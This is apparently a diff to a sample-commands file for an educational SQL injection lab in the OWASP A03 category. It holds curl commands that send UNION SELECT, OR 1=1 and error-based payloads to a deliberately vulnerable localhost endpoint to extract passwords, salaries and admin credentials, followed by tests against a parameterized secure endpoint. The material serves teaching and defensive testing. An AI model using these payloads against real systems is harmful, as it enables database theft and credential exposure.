@@ -2,25 +2,41 @@ A03 - Injection (SQL Injection) - Sample Curl Commands
 ======================================================
 
 Server: python A03_Example_Injection.py
-Port: 5001
+Port: 5002
 
 # Test normal functionality:
 curl http://localhost:5002/api/user/1
 curl http://localhost:5002/api/user/2
 curl http://localhost:5002/api/user/3
-curl http://localhost:5002/api/user/4
 
-# Test SQL injection attacks (EDUCATIONAL PURPOSES ONLY):
+# SQL INJECTION ATTACKS (EDUCATIONAL PURPOSES ONLY):
+
+# 1. Extract all user data including passwords:
 curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,password,role%20FROM%20users--'
-curl 'http://localhost:5002/api/user/1'\''%20OR%20'\''1'\''='\''1'
-curl 'http://localhost:5002/api/user/999%20UNION%20SELECT%201,2,3,4--'
 
-# Test error-based injection:
+# 2. Extract sensitive salary information:
+curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%201,username,salary,role%20FROM%20users--'
+
+# 3. Boolean-based injection (returns all users):
+curl 'http://localhost:5002/api/user/1%20OR%201=1--'
+
+# 4. Extract specific user passwords:
+curl 'http://localhost:5002/api/user/999%20UNION%20SELECT%201,username,password,email%20FROM%20users%20WHERE%20username=%27admin%27--'
+
+# 5. Test error-based injection:
 curl http://localhost:5002/api/user/abc
 curl 'http://localhost:5002/api/user/1'\'''
 
-# Extract all user data:
-curl 'http://localhost:5002/api/user/1%20UNION%20SELECT%20id,username,email,password%20FROM%20users--'
-
 # Vulnerability: Direct SQL query construction without parameterization
-# Impact: Database contents can be extracted, modified, or deleted
+# Impact: Complete database data extraction, password theft, sensitive data exposure
+
+# SECURE ENDPOINT (Solution):
+# Test secure user lookup with parameterized queries:
+curl http://localhost:5002/api/secure/user/1
+curl http://localhost:5002/api/secure/user/2
+
+# Try injection attacks on secure endpoint (should fail safely):
+curl 'http://localhost:5002/api/secure/user/1%20UNION%20SELECT%201,2,3,4--'
+curl 'http://localhost:5002/api/secure/user/1%20OR%201=1--'
+
+# The secure endpoint uses parameterized queries to prevent all injection attacks
